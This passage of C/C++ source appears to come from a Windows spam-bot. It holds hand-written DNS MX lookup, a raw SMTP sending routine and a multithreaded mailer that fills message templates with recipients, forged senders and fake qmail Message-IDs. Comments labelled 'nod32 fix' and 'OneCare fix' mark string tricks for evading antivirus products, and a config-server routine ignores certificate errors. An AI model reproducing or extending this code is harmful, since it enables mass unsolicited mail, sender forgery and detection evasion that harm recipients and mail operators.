		if ((tmp_rr.rdlen < 0) || ((i+tmp_rr.rdlen) > reply_len)) break;

		j = sizeof(struct mx_rrlist_t) + 16;
		newrr = (struct mx_rrlist_t *)mx_alloc(j);
		if (newrr == NULL) break;
		memset((char *)newrr, '\0', j);
		*newrr = tmp_rr;
		i += tmp_rr.rdlen;

		newrr->next = NULL;
		if (top == NULL) {
			root = top = newrr;
		} else {
			top->next = newrr;
			top = newrr;
		}
	}
	return root;
}

static struct mxlist_t *my_get_mx_list2(struct sockaddr_in *dns_addr, const char *domain, int *err_stat)
{
	SOCKET sock;
	int reply_len, rrcode, buf_size;
	int loc_retry;
	struct timeval tv;
	struct fd_set fds;
	char *buf;
	unsigned short query_fl;
	struct dnsreq_t *reply_hdr;
	struct mx_rrlist_t *rrlist=NULL, *rr1;
	struct mxlist_t *mxlist_root, *mxlist_top, *mxlist_new;

	*err_stat = 1;

	buf_size = 4096;
	buf = (char *)mx_alloc(buf_size);
	//memset(buf,0,sizeof(buf_size));
	if (buf == NULL) return NULL;

	sock = (*hSocket)(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == 0 || sock == INVALID_SOCKET) {
		mx_free(buf);
		return NULL;
	}

	for (loc_retry=0; loc_retry<2; loc_retry++) {
		mxlist_root = mxlist_top = NULL;

		if (loc_retry == 0)
			query_fl = (*hHtons)(0x0100);
		else
			query_fl = (*hHtons)(0);

		if (mx_make_query(sock, dns_addr, domain, query_fl))
			continue;

		FD_ZERO(&fds); FD_SET(sock, &fds);
		tv.tv_sec = 12; tv.tv_usec = 0;
		if ((*hSelect)(0, &fds, NULL, NULL, &tv) <= 0)
			continue;

		memset(buf, '\0', sizeof(buf));
		reply_len = (*hRecv)(sock, buf, buf_size,0);
		if (reply_len <= 0 || reply_len <= sizeof(struct dnsreq_t))
			continue;

		reply_hdr = (struct dnsreq_t *)buf;

		rrcode = (*hNtohs)(reply_hdr->flags) & 0x0F;
		if (rrcode == 3) {
			*err_stat = 2;
			break;
		}
		if ((rrcode == 2) && ((*hNtohs)(reply_hdr->flags) & 0x80)) {
			*err_stat = 2;
			break;
		}
		if (rrcode != 0)
			continue;

		rrlist = mx_parse_rr(buf, reply_len);
		if (rrlist == NULL)
			continue;

		mxlist_root = mxlist_top = NULL;
		for (rr1=rrlist; rr1; rr1=rr1->next) {
			if ((rr1->rr_class != CLASS_IN) || (rr1->rr_type != TYPE_MX) || (rr1->rdlen < 3))
				continue;
			mxlist_new = (struct mxlist_t *)mx_alloc(sizeof(struct mxlist_t));
			if (mxlist_new == NULL) break;
			memset(mxlist_new, 0, sizeof(struct mxlist_t));

			mxlist_new->pref = (*hNtohs)(*(WORD *)(buf+rr1->rdata_offs+0));
			mx_decode_domain(buf, rr1->rdata_offs+2, reply_len, mxlist_new->mx);
			if (mxlist_new->mx[0] == 0) {
				mx_free(mxlist_new);
				continue;
			}

			if (mxlist_top == NULL) {
				mxlist_root = mxlist_top = mxlist_new;
			} else {
				mxlist_top->next = mxlist_new;
				mxlist_top = mxlist_new;
			}
		}

		if (mxlist_root == NULL) {
			mx_free_rrlist(rrlist);
			continue;
		}

		mx_free_rrlist(rrlist);
		break;
	}
	mx_free(buf);
	(hClosesocket)(sock);
	return mxlist_root;
}


struct mxlist_t *my_get_mx_list(struct sockaddr_in *dns_addr, const char *domain)
{
	struct mxlist_t *list;
	int i, e;
	for (i=0; i<2; i++) {
		list = my_get_mx_list2(dns_addr, domain, &e);
		if (list != NULL) return list;
		if (e == 2)		// permanent error 
			break;
		Sleep(100);
	}
	return NULL;
}

static struct mxlist_t *getmx_dnsapi(const char *domain)
{
	DNS_RECORD *pQueryResults, *pQueryRec;
	DNS_STATUS statusDns;
	struct mxlist_t *mx_root, *mx_top, *mx_new;

	statusDns = (*hDnsQuery_A)(domain, DNS_TYPE_MX, DNS_QUERY_STANDARD, NULL, &pQueryResults, NULL);
	if (statusDns != ERROR_SUCCESS) return NULL;

	mx_root = mx_top = NULL;
	for (pQueryRec=pQueryResults; pQueryRec; pQueryRec = pQueryRec->pNext) {
		if (pQueryRec->wType != DNS_TYPE_MX) continue;
		mx_new = (struct mxlist_t *)mx_alloc(sizeof(struct mxlist_t));
		if (mx_new == NULL) break;
		memset(mx_new, '\0', sizeof(struct mxlist_t));
		mx_new->pref = pQueryRec->Data.MX.wPreference;
		lstrcpyn(mx_new->mx, pQueryRec->Data.MX.pNameExchange, 255);
		if (mx_top == NULL) {
			mx_root = mx_top = mx_new;
		} else {
			mx_top->next = mx_new;
			mx_top = mx_new;
		}
	}
	return mx_root;
}
//------
typedef DWORD (WINAPI *GetNetworkParams_t)(PFIXED_INFO, PULONG);


static struct mxlist_t *getmx_mydns(const char *domain)
{
	static const char szIphlpapiDll[] = "iphlpapi.dll";
	HINSTANCE hIphlpapi;
	GetNetworkParams_t pGetNetworkParams;
	char *info_buf;
	FIXED_INFO *info;
	IP_ADDR_STRING *pa;
	DWORD dw, info_buf_size;
	struct sockaddr_in addr;
	struct mxlist_t *mxlist;

	hIphlpapi = GetModuleHandle(szIphlpapiDll);
	if (hIphlpapi == NULL || hIphlpapi == INVALID_HANDLE_VALUE)
		hIphlpapi = LoadLibrary(szIphlpapiDll);
	if (hIphlpapi == NULL || hIphlpapi == INVALID_HANDLE_VALUE) return NULL;
	pGetNetworkParams = (GetNetworkParams_t)GetProcAddress(hIphlpapi, "GetNetworkParams");
	if (pGetNetworkParams == NULL) return NULL;

	info_buf_size = 16384;
	info_buf = (char *)mx_alloc(info_buf_size);
	dw = info_buf_size;
	info = (FIXED_INFO *)info_buf;
	if (pGetNetworkParams(info, &dw) != ERROR_SUCCESS)
		return NULL;

	for (mxlist=NULL,pa=&info->DnsServerList; pa; pa=pa->Next) {
		if (pa->IpAddress.String == NULL) continue;
		addr.sin_family = AF_INET;
		addr.sin_port = (*hHtons)(53);
		addr.sin_addr.s_addr = (*hInet_addr)(pa->IpAddress.String);
		if (addr.sin_addr.s_addr == 0 || addr.sin_addr.s_addr == 0xFFFFFFFF) {
			struct hostent *h = (*hGethostbyname)(pa->IpAddress.String);
			if (h == NULL) continue;
			addr.sin_addr = *(struct in_addr *)h->h_addr_list[0];
		}
		if (addr.sin_addr.s_addr == 0 || addr.sin_addr.s_addr == 0xFFFFFFFF)
			continue;

		mxlist = my_get_mx_list(&addr, domain);
		if (mxlist != NULL) break;
	}
	mx_free(info_buf);
	return mxlist;
}

int count_mx_list(struct mxlist_t *p)
{
	int i = 0;
	while (p != NULL) {
		i++;
		p = p->next;
	}
	return i;
}

struct mxlist_t *get_mx_list(const char *domain)
{
	struct mxlist_t *p;
	//
	//if ((p = getmx_dnsapi(domain)) != NULL)
	//	return p;
	//else
	//	return getmx_mydns(domain);
	//
	p = getmx_dnsapi(domain);
	if (count_mx_list(p) > 0) return p;
	p = getmx_mydns(domain);
	if (count_mx_list(p) > 0) return p;
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = (*hHtons)(53);
	sin.sin_addr.s_addr = (*hInet_addr)(alternative_dns);
	p = my_get_mx_list(&sin,domain);
	return p;
}

void free_mx_list(struct mxlist_t *p)
{
	struct mxlist_t *q;
	while (p != NULL) {
		q = p->next;
		mx_free(p);
		p = q;
	}
}
//mx_list end

//inet_routine
int GetContentLength(char * Buf)
{
	char * StartPos;
	char * EndPos;
	char sContentLength[] = "Content-Length: ";
	char sDigits[MAX_PATH];

	if (NULL != Buf) {
		if (NULL != (StartPos = strstr(Buf, sContentLength))) {
			if (NULL != (EndPos = strstr(StartPos, cRN))) {
				StartPos = StartPos + strlen(sContentLength);
				memset(&sDigits, '\0', sizeof(sDigits));
				strncpy(sDigits, StartPos, EndPos - StartPos);
				return atoi(sDigits);
			}
		}
	}
	return -1;
}

SOCKET ConnectToPort(char *host, long host_ip, unsigned int port, unsigned int delay)
{
	unsigned long ip;

	if (host != NULL) {
		ip = (*hInet_addr)(host);
		if (ip == INADDR_NONE) {
			HOSTENT *he;
			he = (*hGethostbyname)(host);
			if (he == NULL)
				ip = INADDR_NONE;
			else
				ip = ((LPIN_ADDR)he->h_addr)->S_un.S_addr;
		}
	} else
		ip = host_ip;

	if (ip == INADDR_NONE) {
		return SOCKET_ERROR;
	}

	SOCKADDR_IN sin;
//	unsigned long blockcmd = 1;

	SOCKET sock = (*hSocket)(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = (*hHtons)((unsigned short)port);
//	(*hIoctlsocket)(sock, FIONBIO, &blockcmd);

	TIMEVAL timeout;
	timeout.tv_sec = delay * 1000;
	timeout.tv_usec = 0;
	(*hSetsockopt)(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
	(*hSetsockopt)(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

	if (SOCKET_ERROR == (*hConnect)(sock, (LPSOCKADDR)&sin, sizeof(sin)))
	{
		(*hShutdown)(sock, SD_BOTH);
		(*hClosesocket)(sock);
		return SOCKET_ERROR;
	}
	return sock;
}

int CustomInternetReadRawData(char * sServer, DWORD dwPort, char * sPage, char * Buf, int BufLen)
{
    int iResult;

    SOCKET ConnectSocket;

    char Request[512];
	int iRequestLen = (int)strlen(cGetRequestStart);
	// adding "GET "
	sprintf(Request, "%s%s%s%s", cGetRequestStart, sServer, sPage, cGetRequestEnd);
	iRequestLen = (int)strlen(Request);

    // Create a SOCKET for connecting to server
	ConnectSocket = ConnectToPort(sServer, NULL, dwPort, 20);
	if (ConnectSocket == INVALID_SOCKET)
		return 0;

	int nParam = 20000;
	(*hSetsockopt)(ConnectSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&nParam, sizeof(nParam));
	nParam = 10000;
	(*hSetsockopt)(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&nParam, sizeof(nParam));

    // Send an initial buffer
    iResult = (*hSend)(ConnectSocket, &Request[0], (int)strlen(Request), 0);
    if (iResult == SOCKET_ERROR) {
        (*hClosesocket)(ConnectSocket);
        return 0;
    }
    // shutdown the connection since no more data will be sent
    iResult = (*hShutdown)(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        (*hClosesocket)(ConnectSocket);
        (*hWSAGetLastError)();
        return 0;
    }

	Sleep(100);
	DWORD dwTotalBytes = 0;
	DWORD dwReceived, dwContentLength = (DWORD)(-1);
	DWORD dwFailedAttempts = 0;
	#define MAX_FAILED_ATTEMPTS 1000
    // Receive until the peer closes the connection
    do {
		if (SOCKET_ERROR == (dwReceived = (*hRecv)(ConnectSocket, Buf + dwTotalBytes, BufLen - dwTotalBytes, 0)))
			return 0;
		if ( dwReceived > 0 ) {
			dwFailedAttempts = 0;
			dwTotalBytes = dwTotalBytes + dwReceived;
		} else {
			dwFailedAttempts += 1;
			if ( iResult == 0 ) { } else (*hWSAGetLastError)();
		}
		// if first packet received
		if ((dwTotalBytes == dwReceived)&&(dwReceived != 0))
		{
			dwContentLength = GetContentLength(Buf);
			if (dwContentLength != (DWORD)(-1))
			{
				char * RNRN;
				RNRN = strstr(Buf, cRNRN);
				DWORD dwDataPositionInBuf = (DWORD)(RNRN - Buf);
				dwContentLength = dwContentLength + dwDataPositionInBuf + 4;
			}
		}
		if ((dwContentLength != DWORD(-1)) && (dwTotalBytes >= dwContentLength))
			break;

		struct timeval tv;
		struct fd_set fds;
		FD_ZERO(&fds);
		FD_SET(ConnectSocket, &fds);
		tv.tv_sec = 12;
		tv.tv_usec = 0;
		if ((*hSelect)(0, &fds, NULL, NULL, &tv) <= 0)
		{
			continue;
		} else {
			Sleep(5);
		}
	} while (
		(dwReceived != 0) ||
		(
//		  (dwContentLength != DWORD(-1)) &&
//		  (dwTotalBytes < dwContentLength) &&
		  (dwFailedAttempts < MAX_FAILED_ATTEMPTS)
		)
	);
    // cleanup
    (*hClosesocket)(ConnectSocket);
	if (dwFailedAttempts == MAX_FAILED_ATTEMPTS)
		return 0;
	if (dwTotalBytes == 0)
		return 0;
	return dwTotalBytes;
}

int CustomInternetReadFile(char * sServer, DWORD dwPort, char * sPage, char * Buf, int BufLen)
{
	char * BufStart;
	if ((NULL == Buf) || (NULL == sServer) || (NULL == sPage))
		return 0;
	int iReceivedSize = CustomInternetReadRawData(sServer, dwPort, sPage, Buf, BufLen);
	BufStart = strstr(Buf, cRNRN) + 4;
	return (int)(iReceivedSize - (BufStart - Buf));
}

//PCHAR GetCookie(char * cBuf, char * cResult, DWORD dwResultSize)
//{
//	char cCookie[] = "Cookie: ";
//	char * res1, * res2;
//	if (NULL == cBuf)
//		return cResult;
//	res1 = strstr(cBuf, cCookie);
//	if (res1 != NULL) {
//		//res1 = res1 + strlen(cCookie);
//		res2 = strstr(res1, cPointComma);
//
//		if ( (res1 != NULL) && (res2 != NULL) && (dwResultSize >= res2 - res1)) {
//			strncpy(cResult, res1, res2 - res1);
//			cResult[res2 - res1] = '\0';
//			//strcat(cResult, "\r\n");
//		}
//	}
//	return cResult;
//}

DWORD HttpSay(char * cServer, char * cPage,
              char * cMethod, char * cReferer,
			  char * cAdditionalHeader, DWORD dwAdditionalHeaderSize,
			  char * cPostData, DWORD dwPostDataSize, 
			  char * cOutData, DWORD dwOutDataSize,
			  bool bSecure,
			  char * cUserAgent = NULL)
{
	HINTERNET hRequest, hConnect, hInternet;
	DWORD dwBytesRead, dwTotalBytesRead = 0;

	//AddToLog(cServer);
	//AddToLog(cPage);
	//AddToLog("\n");

	if (!cUserAgent)
		hInternet = (*hInternetOpen)(bMozillaBrowser, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	else
		hInternet = (*hInternetOpen)(cUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	if (hInternet != 0)
	{
		INTERNET_PORT ServerPort;
		if ((cServer == cConfigServer) && bUseReserveConfigPort) {
			ServerPort = atoi(cReserveConfigPort);
		} else {
			if (bSecure)
				ServerPort = INTERNET_DEFAULT_HTTPS_PORT;
			else
				ServerPort = INTERNET_DEFAULT_HTTP_PORT;
		}
		hConnect = (*hInternetConnect)(hInternet,(LPCSTR)cServer, ServerPort, 0, 0, INTERNET_SERVICE_HTTP, 0, 1);
		if (hConnect != 0)
		{
			DWORD dwFlags;
			dwFlags = INTERNET_FLAG_KEEP_CONNECTION + INTERNET_FLAG_DONT_CACHE + INTERNET_FLAG_RELOAD;
			if (bSecure)
				dwFlags = dwFlags + INTERNET_FLAG_IGNORE_CERT_CN_INVALID + INTERNET_FLAG_IGNORE_CERT_DATE_INVALID + INTERNET_FLAG_SECURE;
			hRequest = (*hHttpOpenRequest)(hConnect, cMethod, cPage, NULL, cReferer, NULL, dwFlags, 1);
			if (hRequest != 0)
			{
				//INTERNET_DIAGNOSTIC_SOCKET_INFO SockInfo;
				//DWORD dwSockInfoSize;
				//dwSockInfoSize = sizeof(SockInfo);
				//if (!(*hInternetQueryOption)(hRequest, INTERNET_OPTION_DIAGNOSTIC_SOCKET_INFO, &SockInfo, &dwSockInfoSize))
				//	dwSockInfoSize = GetLastError();

				//DWORD dwFlags;
				//DWORD dwBuffLen = sizeof(dwFlags);
				//if (bSecure)
				//{
				//	(*hInternetQueryOption)(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen);
				//	dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
				//	(*hInternetSetOption)(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags));
				//}

				BOOL bSend;
				char cHeader[0x4000];

				bSend = (*hHttpSendRequest)(hRequest, cAdditionalHeader, dwAdditionalHeaderSize, cPostData, dwPostDataSize);
				if (bSend == 0)
					bSend = GetLastError();

				dwBytesRead = sizeof(cHeader);
				(*hHttpQueryInfo)(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, &cHeader, &dwBytesRead, NULL);

				do {
					(*hInternetReadFile)(hRequest, cOutData + dwTotalBytesRead, dwOutDataSize - dwTotalBytesRead, &dwBytesRead);
					dwTotalBytesRead = dwTotalBytesRead + dwBytesRead;
				} while (dwBytesRead != 0);

				dwBytesRead = sizeof(cHeader);
				(*hHttpQueryInfo)(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, &cHeader, &dwBytesRead, NULL);

//				if (cAdditionalHeader != NULL)
//					GetCookie(cHeader, cAdditionalHeader, dwAdditionalHeaderSize);

				(*hInternetCloseHandle)(hRequest);
			}
			(*hInternetCloseHandle)(hConnect);
		}
		(*hInternetCloseHandle)(hInternet);
	}
	//AddToLog(cOutData);
	//AddToLog("\n");
	return dwTotalBytesRead;
}
//inet_routine end

//smtp_routine
char * GenerateMID(char * pcMID, char * cHostname, DWORD dwQmail_idcount)
{
	SYSTEMTIME stTime;
	FILETIME ftTime;
	char cHost[MAX_PATH];

	GetLocalTime(&stTime);	
	/*
	SystemTimeToFileTime(&stTime,&ftTime);
	(*hGethostname)(cHost, sizeof(cHost));
	sprintf(pcMID, cSMTP_FORMAT_MID, g_dwBoundary+3, ftTime.dwHighDateTime, ftTime.dwLowDateTime, g_dwLocalIP, cHost);
	*/
	sprintf(pcMID, "%d%.2d%.2d%.2d%.2d%.2d.%d.qmail@%s", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond, dwQmail_idcount + 2, cHostname);
	return pcMID;
}

PCHAR GenerateBoundary(char * pcBoundary, DWORD dwPart, PSYSTEMTIME pstTime)
{
	FILETIME ftTime;
	g_dwBoundary++;	
	(*hSystemTimeToFileTime)(pstTime, &ftTime);
	sprintf(pcBoundary, cSMTP_FORMAT_BOUNDARY, dwPart, g_dwBoundary, ftTime.dwHighDateTime, ftTime.dwLowDateTime);	
	return pcBoundary;
}

char * SMTPGetPreferedServer(PDNS_RECORD pdrQuery)
{
	DNS_MX_DATA dmdServer={};

	PDNS_RECORD pdrName=pdrQuery;

	dmdServer.wPreference=-1;
	while((pdrQuery!=0)&&(pdrQuery->wType==DNS_TYPE_MX))
	{
		if(pdrQuery->Data.MX.wPreference<dmdServer.wPreference)
		{
			dmdServer=pdrQuery->Data.MX;
		}
		pdrQuery=pdrQuery->pNext;
	}
	return dmdServer.pNameExchange;
}

int smtp_send(char * cMsg, DWORD dwMessageLength, char * cServer, char * cFromServer, char * cFromName, char * cFromEmail, char * cPassword, char * cRecepient, char * cReplaceBuffer)
{
	//AddToLog("smtp_send\n");
	int result = 0;
	//char cSmtpError[10000];
	//memset(cSmtpError, '\0', sizeof(cSmtpError));
	char cBuf[10000];
	memset(cBuf, '\0', sizeof(cBuf));

	PDNS_RECORD pdrQuery;

	if ((*hDnsQuery_A)(cServer, DNS_TYPE_MX, DNS_QUERY_STANDARD, 0, &pdrQuery, 0)==0)
	{
		char * pcServer, cServerBuf[MAX_PATH];
		pcServer = SMTPGetPreferedServer(pdrQuery);
		if (pcServer != 0) {
			strcpy(cServerBuf, pcServer);
		} else cServerBuf[0] = '\0';
		(*hDnsRecordListFree)(pdrQuery, DnsFreeRecordList);

		if (strlen(cServerBuf) != 0)
		{
			sprintf(cBuf, "Connecting %s ...\r\n", cServerBuf);
			//AddToLog(cBuf);
			SOCKET s = ConnectToPort(cServerBuf, NULL, 25, 55);
			if (s == SOCKET_ERROR)
			{
				//sprintf(cSmtpError, "Connection to %s failed\r\n", cServerBuf);
				dwError[03]++;
				result = 2;
			} else {
				DWORD dwReceived;
				memset(cBuf, '\0', sizeof(cBuf));
				if (SOCKET_ERROR == (dwReceived = (*hRecv)(s, cBuf, sizeof(cBuf)-1, 0))) {
					//strcpy(cSmtpError, "recv() error\r\n");
					dwError[03]++;
					result = 2;
				} else {
					//AddToLog(cBuf);
					if (strstr(cBuf, "220") != NULL) {

						//char cHost[MAX_PATH];
						//(*hGethostname)(cHost,sizeof(cHost));
						sprintf(cBuf, "HELO %s\r\n", Job.cRealHostname);
						//AddToLog(cBuf);
						if ((*hSend)(s, cBuf, (int)strlen(cBuf), 0) == SOCKET_ERROR)
						{
							//strcpy(cSmtpError, "send() error\r\n");
							dwError[11]++;
							result = 2;
						} else {
							memset(cBuf, '\0', sizeof(cBuf));
							if (SOCKET_ERROR == (dwReceived = (*hRecv)(s, cBuf, sizeof(cBuf)-1, 0)))
							{
								//strcpy(cSmtpError, "recv() error\r\n");
								dwError[12]++;
								result = 2;
							} else {
								//AddToLog(cBuf);

								sprintf(cBuf, "MAIL FROM: <%s>\r\n", cFromEmail);
								//AddToLog(cBuf);
								if (SOCKET_ERROR == (*hSend)(s, cBuf, (int)strlen(cBuf), 0))
								{
									//strcpy(cSmtpError, "send() error\r\n");
									dwError[14]++;
									result = 2;
								} else {
									memset(cBuf, '\0', sizeof(cBuf)-1);
									do {
										Sleep(100);
										if (SOCKET_ERROR == (dwReceived = (*hRecv)(s, cBuf, sizeof(cBuf)-1, 0)))
										{
											//strcpy(cSmtpError, "recv() error\r\n");
											dwError[15]++;
											result = 2;
											break;
										}
									} while (dwReceived == 0);
									if (result == 0)
									{
										//AddToLog(cBuf);
										if (ReplaceStringUsingBuf(cBuf, "250", "250", cReplaceBuffer)) { // 250 = Ok   //nod32 fix
											sprintf(cBuf, "RCPT TO: <%s>\r\n", cRecepient);
											//AddToLog(cBuf);
											if (SOCKET_ERROR == (*hSend)(s, cBuf, (int)strlen(cBuf), 0))
											{
												//strcpy(cSmtpError, "send() error\r\n");
												dwError[17]++;
												result = 2;
											} else {
												memset(cBuf, '\0', sizeof(cBuf));
												do {
													Sleep(100);
													if (SOCKET_ERROR == (dwReceived = (*hRecv)(s, cBuf, sizeof(cBuf)-1, 0)))
													{
														//strcpy(cSmtpError, "recv() error\r\n");
														dwError[18]++;
														result = 2;
														break;
													}
												} while (dwReceived == 0);
												if (result == 0)
												{
													//AddToLog(cBuf);
													if (ReplaceStringUsingBuf(cBuf, "250", "250", cReplaceBuffer)) { // 250 = Ok  // 550 -= User Unknown, message rejected  // nod32 fix
														//AddToLog(cData);
														if (SOCKET_ERROR == (*hSend)(s, cData, (int)strlen(cData), 0))
														{
															//strcpy(cSmtpError, "send() error\r\n");
															dwError[20]++;
															result = 2;
														} else {
															memset(cBuf, '\0', sizeof(cBuf));
															do {
																Sleep(100);
																if (SOCKET_ERROR == (dwReceived = (*hRecv)(s, cBuf, sizeof(cBuf)-1, 0)))
																{
																	//strcpy(cSmtpError, "recv() error\r\n");
																	dwError[21]++;
																	result = 2;
																	break;
																}
															} while (dwReceived == 0);
															if (result == 0)
															{
																//AddToLog(cBuf);

																//AddToLog(cMsg);
																//AddToLog("@@FORMATTED_MESSAGE@@");
																(*hSend)(s, cMsg, dwMessageLength, 0);
																//AddToLog(cRNdotRN);
																if (SOCKET_ERROR == (*hSend)(s, cRNdotRN, (int)strlen(cRNdotRN), 0))
																{
																	//strcpy(cSmtpError, "send() error\r\n");
																	dwError[23]++;
																	result = 2;
																} else {

																	memset(cBuf, '\0', sizeof(cBuf));
																	do {
																		Sleep(100);
																		if (SOCKET_ERROR == (dwReceived = (*hRecv)(s, cBuf, sizeof(cBuf) - 1, 0)))
																		{
																			//strcpy(cSmtpError, "recv() erro\r\nr");
																			dwError[24]++;
																			result = 2;
																			break;
																		}
																	} while (dwReceived == 0);
																	//AddToLog(cBuf);
																	if (ReplaceStringUsingBuf(cBuf, "250", "250", cReplaceBuffer)) { // 250 = Ok  // nod32 fix
																		result = 0;
																		dwNoErrors++;
																		//strcpy(cSmtpError, " --- ACCEPTED ---\r\n");
																		//AddToLog("Message sent\n");
																	} else {
																		dwError[24]++; //554 Transaction Failed Spam Message not queued.
																		result = 2;
																		//strcpy(cSmtpError, cBuf);
																		//AddToLog("Message not sent\n");
																	}
																}
															}
														}

													} else {
														dwError[19]++;
														result = 2;
														//strcpy(cSmtpError, cBuf);
													}
												}
											}
										} else {
											dwError[16]++;
											result = 2;
											//strcpy(cSmtpError, cBuf);
										}
									}
								}
							}
						}
					} else {
						dwError[10]++;
						result = 2;
						//strcpy(cSmtpError, cBuf);
					}
				}
			}
			(*hShutdown)(s, SD_BOTH);
			(*hClosesocket)(s);
		} else {
			dwError[3]++;
			result = 2; // can't locate MX server
			//sprintf(cSmtpError, "Can't locate MX server by %s\r\n", cServer);
		}
	} else {
		dwError[2]++;
		result = 2; // can't locate DNS QUERY
		//sprintf(cSmtpError, "Can't query to %s\r\n", cServer);
	}
	////AddToLog(cSmtpError);
	return result;
}

DWORD GetMXConnectionsCount(char * cMXServer)
{
	DWORD dwCount = 0;
	for (int i = 0; i < MAX_THREADS; i++)
	{
		if ((dwThreadStatus[i] == THREAD_STATUS_WORKING) && (cMXConnected[i] ) && (strcmp(cMXServer, cMXServers + i * MAX_PATH) == 0))
			dwCount++;
	}
	return dwCount;
}

unsigned int __stdcall SmtpThread(LPVOID tParam)
{
	int res = 0;
	PSMTP_THREAD_DATA pData;
	pData = (PSMTP_THREAD_DATA)tParam;
	char * cMsg = pData->cFormattedMessage;
	char * cReplaceBuffer = pData->cReplcaeBuffer;
	DWORD dwRnd1 = RtlRandom(&g_dwRndSeed);
	DWORD dwRnd2 = RtlRandom(&g_dwRndSeed);
	DWORD dwQmail_idcount = 2001 + dwRnd1%1024;
	DWORD dwQmail_uid = 101 + dwRnd2%790;

	if (cMsg != NULL)
	{
		char * cInput;
		char cTO_EMAIL[] = "TO_EMAIL";
		char cREAL_IP[] = "REAL_IP";
		char cQM_RECEIVED[] = "QM_RECEIVED";
		char cQM_MESSID[] = "QM_MESSID";
		char cBODYtag[] = "<body>";
		char cBODYtag_close[] = "</body>";
		char cFromEmail[MAX_PATH], cFromName[MAX_PATH], cFromServer[MAX_PATH], cToName[MAX_PATH], cToEmail[MAX_PATH];
		char cServer[MAX_PATH];

		char cMID[MAX_PATH];
		GenerateMID(cMID, Job.cRealHostname, dwQmail_idcount);
		char cBoundaryFirst[SMTP_BOUNDARY_SIZE];
		SYSTEMTIME stDate;
		SYSTEMTIME stTime;

		cInput = pData->cMessageTemplate;

		// Generating main vars
		GetSystemTime(&stDate);
		GetLocalTime(&stTime);

		GenerateBoundary(cBoundaryFirst, 0, &stTime);

		memset(cMsg, '\0', MAX_PACKET_SIZE);
		strcpy(cMsg, cInput);

		strcpy(cToEmail, pData->cMailTo);
		char * cDog = strchr(cToEmail, '@');
		if (cDog == NULL) return 1;
		char * cDot = strchr(cDog, '.');
		if (cDot == NULL) return 1;
		ExtractData(cToEmail, "@", cToName, sizeof(cToName));

		char cTemplate[MAX_PATH];  // Windows Line OneCare fix
		sprintf(cTemplate, "$TO_%s", "NAME");
		while (ReplaceStringUsingBuf(cMsg, cTemplate, cToName, cReplaceBuffer)) { }
		sprintf(cTemplate, "$TO_%s", "EMAIL");
		while (ReplaceStringUsingBuf(cMsg, cTemplate, cToEmail, cReplaceBuffer)) { }
		sprintf(cTemplate, "@@TO_%s", "NAME");
		while (ReplaceStringUsingBuf(cMsg, cTemplate, cToName, cReplaceBuffer)) { }
		sprintf(cTemplate, "@@TO_%s", "EMAIL");
		while (ReplaceStringUsingBuf(cMsg, cTemplate, cToEmail, cReplaceBuffer)) { }

		char * tmp_pointer;
		char cTmpFromData[MAX_PATH] = "";
		tmp_pointer = strstr(cMsg, "From: ");
		if (tmp_pointer != NULL)
			tmp_pointer = tmp_pointer + strlen("From: ");
		else
		{
			tmp_pointer = strstr(cMsg, "From:");
			if (tmp_pointer != NULL)
				tmp_pointer = tmp_pointer + strlen("From:");
		}
		ExtractData(tmp_pointer, "\r\n", cTmpFromData, sizeof(cTmpFromData));

		if (strstr(cTmpFromData, "<") != NULL)
		{
			ExtractData(cTmpFromData, "<", cFromName, sizeof(cFromName));
			if (cFromName[0] == '\"')
			{
				char TMP[MAX_PATH];
				strcpy(TMP, cFromName);
				ExtractData(TMP + 1, "\"", cFromName, sizeof(cFromName));
			} else {
				bool bEmptyName = true;
				for (int i=0; i<(int)strlen(cFromName); i++)
				{
					if (cFromName[i] != ' ')
					{
						bEmptyName = false;
						break;
					}
				}
				if (bEmptyName)
					strcpy(cFromName, "");
			}
			char * cDivider = strstr(cTmpFromData, "<");
			if (cDivider == 0)
			{
				dwUnexpectedErrors++;
				res = 2;
			} else {
				ExtractData(cDivider + 1, ">", cFromEmail, sizeof(cFromEmail));
			}
		} else {
			strcpy(cFromEmail, cTmpFromData);
		}

		if (res == 0)
		{

			if (strlen(cFromEmail) == 0)
				strcpy(cFromEmail, cToEmail);

			ReplaceStringUsingBuf(cFromEmail, "@@FROM_EMAIL", pData->cMailFrom, cReplaceBuffer);

			if (strlen(cFromName) == 0)
				ExtractData(cFromEmail, "@", cFromName, sizeof(cFromName));

			if (strstr(cFromName, "@@FROM_NAME"))
				ExtractData(cFromEmail, "@", cFromName, sizeof(cFromName));
			
			while (ReplaceStringUsingBuf(cMsg, "@@FROM_EMAIL", cFromEmail, cReplaceBuffer)) { }
			while (ReplaceStringUsingBuf(cMsg, "@@FROM_NAME", cFromName, cReplaceBuffer)) { }
			while (ReplaceStringUsingBuf(cMsg, "@@MESSAGE_ID", cMID, cReplaceBuffer)) { }
			while (ReplaceStringUsingBuf(cMsg, "@@BOUNDARY", cBoundaryFirst, cReplaceBuffer)) { }
			char cDate[MAX_PATH];
			sprintf(cDate,"%s, %.2d %s %d %.2d:%.2d:%.2d %.4d", pcDays[stDate.wDayOfWeek], stDate.wDay, pcMonths[stDate.wMonth], stDate.wYear, stDate.wHour, stDate.wMinute, stDate.wSecond, tziZone.Bias);
			char cReceived[MAX_PATH];
